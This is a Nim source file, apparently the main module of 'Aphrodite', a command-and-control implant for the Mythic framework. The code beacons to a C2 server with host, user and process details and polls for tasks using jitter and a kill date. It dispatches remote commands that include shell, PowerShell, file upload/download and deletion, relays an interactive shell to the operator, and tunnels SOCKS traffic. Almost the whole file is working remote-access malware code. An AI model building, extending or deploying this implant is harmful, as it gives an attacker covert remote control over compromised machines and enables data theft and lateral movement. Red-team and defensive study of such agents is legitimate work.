import std/[json, os, strutils, times, random, base64]
import config, crypto, http_transport, utils, types
import jobs, socks_mgr
import commands/registry
import commands/shell, commands/ls, commands/whoami, commands/pwd
import commands/cd, commands/cat, commands/sleep_cmd, commands/exit_cmd
import commands/mkdir, commands/rm, commands/mv, commands/cp
import commands/env, commands/hostname_cmd, commands/ps, commands/kill_cmd
import commands/tail, commands/echo_cmd, commands/drives, commands/ifconfig
import commands/arp, commands/nslookup, commands/uptime
import commands/getenv, commands/setenv
import commands/download, commands/upload
import commands/psh, commands/socks

randomize()

# ---------------------------------------------------------------------------
# Interact message_type constants (matches Mythic's InteractiveMessageType)
# ---------------------------------------------------------------------------
const
  INTERACT_INPUT     = 0
  INTERACT_OUTPUT    = 1
  INTERACT_ERROR     = 2
  INTERACT_EXIT      = 3
  INTERACT_ESCAPE    = 4   ## ESC   0x1B
  INTERACT_CTRL_A    = 5   ## ^A    0x01
  INTERACT_CTRL_B    = 6   ## ^B    0x02
  INTERACT_CTRL_C    = 7   ## ^C    0x03  interrupt
  INTERACT_CTRL_D    = 8   ## ^D    0x04  EOF / delete
  INTERACT_CTRL_E    = 9   ## ^E    0x05  end
  INTERACT_CTRL_F    = 10  ## ^F    0x06  forward
  INTERACT_CTRL_G    = 11  ## ^G    0x07  cancel search
  INTERACT_BACKSPACE = 12  ## ^H    0x08
  INTERACT_TAB       = 13  ## ^I    0x09
  INTERACT_CTRL_K    = 14  ## ^K    0x0B  kill forwards
  INTERACT_CTRL_L    = 15  ## ^L    0x0C  clear screen
  INTERACT_CTRL_N    = 16  ## ^N    0x0E  next history
  INTERACT_CTRL_P    = 17  ## ^P    0x10  prev history
  INTERACT_CTRL_Q    = 18  ## ^Q    0x11  unpause
  INTERACT_CTRL_R    = 19  ## ^R    0x12  search history
  INTERACT_CTRL_S    = 20  ## ^S    0x13  pause
  INTERACT_CTRL_U    = 21  ## ^U    0x15  kill backwards
  INTERACT_CTRL_W    = 22  ## ^W    0x17  kill word
  INTERACT_CTRL_Y    = 23  ## ^Y    0x19  yank
  INTERACT_CTRL_Z    = 24  ## ^Z    0x1A  suspend

# ---------------------------------------------------------------------------

type
  AphroditeAgent* = ref object
    payloadUUID: string
    mythicID:    string
    aesKey:      seq[byte]
    transport:   Transport
    state:       AgentState

proc newAphroditeAgent*(): AphroditeAgent =
  ## Register all commands then build the agent object.
  initShell();    initLs();       initWhoami();   initPwd()
  initCd();       initCat();      initSleep();    initExit()
  initMkdir();    initRm();       initMv();       initCp()
  initEnv();      initHostname(); initPs();       initKill()
  initTail();     initEcho();     initDrives();   initIfconfig()
  initArp();      initNslookup(); initUptime()
  initGetenv();   initSetenv()
  initDownload(); initUpload()
  initPsh();      initSocks()

  result = AphroditeAgent(
    payloadUUID: AgentUUID,
    mythicID:    "",
    aesKey:      @[],
    transport:   newTransport(),
    state: AgentState(
      cwd:           getCurrentDir(),
      sleepInterval: SleepInterval,
      jitter:        JitterPercent,
      running:       true,
    ),
  )

# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

proc currentUUID(ag: AphroditeAgent): string =
  let id = if ag.mythicID.len > 0: ag.mythicID else: ag.payloadUUID
  result = id
  while result.len < 36:
    result.add('\x00')
  result = result[0 .. 35]

proc sleepWithJitter(ag: AphroditeAgent) =
  var ms = ag.state.sleepInterval * 1000
  if ag.state.jitter > 0:
    let reduction = int(float(ms) * float(ag.state.jitter) / 100.0 * rand(1.0))
    ms = max(100, ms - reduction)
  sleep(ms)

proc sendMessage(ag: AphroditeAgent, body: JsonNode): JsonNode =
  let jsonStr = $body
  debugLog("TX: " & jsonStr[0 .. min(200, jsonStr.high)])
  let raw = ag.transport.post(ag.currentUUID(), ag.aesKey, jsonStr)
  if raw.len == 0:
    return newJNull()
  try:
    result = parseJson(raw)
    debugLog("RX: " & raw[0 .. min(200, raw.high)])
  except JsonParsingError as e:
    debugLog("JSON parse error: " & e.msg)
    result = newJNull()

proc makeSendMsg(ag: AphroditeAgent): SendMsg =
  result = proc(msg: JsonNode): JsonNode =
    return ag.sendMessage(msg)

proc setupPsk(ag: AphroditeAgent): bool =
  if AesPsk.len == 0:
    ag.aesKey = @[]
    stderr.writeLine("[*] No PSK configured — plaintext mode")
    return true
  ag.aesKey = base64Key(AesPsk)
  if ag.aesKey.len != 32:
    stderr.writeLine("[!] Invalid PSK length — falling back to plaintext")
    ag.aesKey = @[]
  else:
    stderr.writeLine("[*] PSK loaded (" & $ag.aesKey.len & " bytes)")
  return true

# ---------------------------------------------------------------------------
# Checkin
# ---------------------------------------------------------------------------

proc checkin(ag: AphroditeAgent): bool =
  if not ag.setupPsk():
    return false

  let msg = %*{
    "action":          "checkin",
    "uuid":            ag.payloadUUID,
    "ips":             [getLocalIP()],
    "os":              getOS(),
    "user":            getUsername(),
    "host":            getHostname(),
    "pid":             getPid(),
    "architecture":    getArch(),
    "domain":          "",
    "integrity_level": 2,
    "external_ip":     getLocalIP(),
    "process_name":    "",
    "cwd":             ag.state.cwd,
  }

  let resp = ag.sendMessage(msg)
  if resp.kind == JNull:
    return false
  if resp{"status"}.getStr("") != "success":
    debugLog("Checkin failed: " & $resp)
    return false

  var id = resp{"id"}.getStr("")
  if id.len == 0: id = resp{"agent_callback_id"}.getStr("")
  if id.len == 0: id = resp{"uuid"}.getStr("")

  if id.len > 0:
    ag.mythicID = id
    debugLog("Checkin OK — callback ID: " & ag.mythicID)
    return true

  debugLog("Checkin: no callback ID in response")
  return false

# ---------------------------------------------------------------------------
# Task dispatch
# ---------------------------------------------------------------------------

proc getParam(params: JsonNode, key: string): string =
  if params.kind != JObject: return ""
  let val = params{key}
  if val.isNil: return ""
  case val.kind
  of JString:
    let s = val.getStr()
    if s.startsWith("{") or s.startsWith("["):
      try:
        let inner = parseJson(s)
        return inner{key}.getStr("")
      except: return s
    return s
  of JInt:   return $val.getInt()
  of JFloat: return $val.getFloat()
  of JBool:  return $val.getBool()
  else:      return ""

proc dispatchTask(ag: AphroditeAgent, task: JsonNode): JsonNode =
  let taskID    = task{"id"}.getStr("")
  let cmd       = task{"command"}.getStr("")
  let paramsRaw = task{"parameters"}.getStr("{}")

  var params = newJObject()
  try:
    params = parseJson(paramsRaw)
  except:
    params = %*{"raw": paramsRaw}

  debugLog("Task [" & taskID & "] cmd=" & cmd)

  let sendMsg = ag.makeSendMsg()
  let res = dispatch(cmd, taskID, params, ag.state, sendMsg)

  result = %*{
    "task_id":     taskID,
    "user_output": res.output,
    "completed":   res.completed,
    "status":      res.status,
  }

proc checkKilldate(ag: AphroditeAgent) =
  if KillDate.len == 0: return
  try:
    if now() > parse(KillDate, "yyyy-MM-dd"):
      debugLog("Kill date reached — exiting.")
      ag.state.running = false
  except: discard

# ---------------------------------------------------------------------------
# Interact helpers
# ---------------------------------------------------------------------------

proc ctrlByte(msgType: int): char =
  ## Map Mythic's InteractiveMessageType to the corresponding control byte.
  case msgType
  of INTERACT_ESCAPE:    '\x1B'
  of INTERACT_CTRL_A:    '\x01'
  of INTERACT_CTRL_B:    '\x02'
  of INTERACT_CTRL_C:    '\x03'
  of INTERACT_CTRL_D:    '\x04'
  of INTERACT_CTRL_E:    '\x05'
  of INTERACT_CTRL_F:    '\x06'
  of INTERACT_CTRL_G:    '\x07'
  of INTERACT_BACKSPACE: '\x08'
  of INTERACT_TAB:       '\x09'
  of INTERACT_CTRL_K:    '\x0B'
  of INTERACT_CTRL_L:    '\x0C'
  of INTERACT_CTRL_N:    '\x0E'
  of INTERACT_CTRL_P:    '\x10'
  of INTERACT_CTRL_Q:    '\x11'
  of INTERACT_CTRL_R:    '\x12'
  of INTERACT_CTRL_S:    '\x13'
  of INTERACT_CTRL_U:    '\x15'
  of INTERACT_CTRL_W:    '\x17'
  of INTERACT_CTRL_Y:    '\x19'
  of INTERACT_CTRL_Z:    '\x1A'
  else:                  '\x00'  ## unknown → no-op

proc processInteractIn(interactArr: JsonNode) =
  ## Handle interactive messages from Mythic (operator → shell).
  if interactArr.isNil or interactArr.kind != JArray: return
  for msg in interactArr:
    let taskId  = msg{"task_id"}.getStr("")
    let msgType = msg{"message_type"}.getInt(-1)
    let data    = decode(msg{"data"}.getStr(""))

    if msgType == INTERACT_INPUT:
      jobWriteInput(taskId, data)
    elif msgType == INTERACT_EXIT:
      jobKill(taskId)
    else:
      let b = ctrlByte(msgType)
      if b != '\x00':
        jobWriteInput(taskId, $b)

proc collectInteractOut(): JsonNode =
  ## Collect stdout from all active interactive jobs → interact array for Mythic.
  result = newJArray()
  for taskId in jobActiveList():
    let output = jobDrainOutput(taskId)
    if output.len > 0:
      result.add(%*{
        "task_id":      taskId,
        "data":         encode(output),
        "message_type": INTERACT_OUTPUT,
      })
    ## If the job is no longer alive, send completion
    if not jobIsAlive(taskId):
      result.add(%*{
        "task_id":      taskId,
        "data":         encode("Process exited.\n"),
        "message_type": INTERACT_EXIT,
      })

# ---------------------------------------------------------------------------
# SOCKS helpers
# ---------------------------------------------------------------------------

proc processSocksIn(socksArr: JsonNode): seq[JsonNode] =
  ## Process incoming socks datagrams from Mythic.
  result = @[]
  if socksArr.isNil or socksArr.kind != JArray: return
  for item in socksArr:
    let serverId = item{"server_id"}.getInt(-1)
    let exit     = item{"exit"}.getBool(false)
    let rawData  = decode(item{"data"}.getStr(""))
    for (sid, respData) in socksHandleData(serverId, rawData, exit):
      result.add(%*{"server_id": sid, "data": encode(respData), "exit": false})

proc collectSocksOut(): seq[JsonNode] =
  ## Drain buffered TCP→Mythic data from all active SOCKS connections.
  result = @[]
  for (sid, respData) in socksCollect():
    result.add(%*{"server_id": sid, "data": encode(respData), "exit": false})
  ## Notify Mythic of closed connections
  for sid in socksCollectExits():
    result.add(%*{"server_id": sid, "data": "", "exit": true})

# ---------------------------------------------------------------------------
# Main C2 loop
# ---------------------------------------------------------------------------

proc run*(ag: AphroditeAgent) =
  stderr.writeLine("[*] Aphrodite starting — UUID=" & ag.payloadUUID)
  stderr.writeLine("[*] C2: " & C2BaseUrl & C2Endpoint)

  var retries = 0
  while ag.state.running and retries < 10:
    if ag.checkin(): break
    inc retries
    let delay = min(60, 5 * retries)
    debugLog("Checkin failed, retry " & $retries & " in " & $delay & "s")
    sleep(delay * 1000)

  if not ag.state.running or ag.mythicID.len == 0:
    stderr.writeLine("[!] Failed to check in after retries. Exiting.")
    return

  stderr.writeLine("[+] Checkin OK — callback ID=" & ag.mythicID)

  var pendingResponses: seq[JsonNode] = @[]
  var pendingSocks:     seq[JsonNode] = @[]

  while ag.state.running:
    ag.checkKilldate()
    if not ag.state.running: break

    ## --- Build get_tasking message ---
    var pollMsg = %*{
      "action":       "get_tasking",
      "tasking_size": -1,
    }
    if pendingResponses.len > 0:
      pollMsg["responses"] = %pendingResponses
      pendingResponses = @[]

    ## Attach pending SOCKS responses from last iteration
    let socksOut = pendingSocks & collectSocksOut()
    pendingSocks = @[]
    if socksOut.len > 0:
      pollMsg["socks"] = %socksOut

    ## Attach interactive shell output
    let interactOut = collectInteractOut()
    if interactOut.len > 0:
      pollMsg["interact"] = interactOut

    ## --- Send / receive ---
    let resp = ag.sendMessage(pollMsg)
    if resp.kind == JNull:
      ag.sleepWithJitter()
      continue

    ## --- Process tasks ---
    let tasks = resp{"tasks"}
    if not tasks.isNil and tasks.kind == JArray:
      for task in tasks:
        let taskResp = ag.dispatchTask(task)
        pendingResponses.add(taskResp)

    ## --- Process interact messages (operator → shell) ---
    processInteractIn(resp{"interact"})

    ## --- Process socks datagrams (Mythic → TCP) ---
    let socksIn = processSocksIn(resp{"socks"})
    pendingSocks.add(socksIn)

    ag.sleepWithJitter()
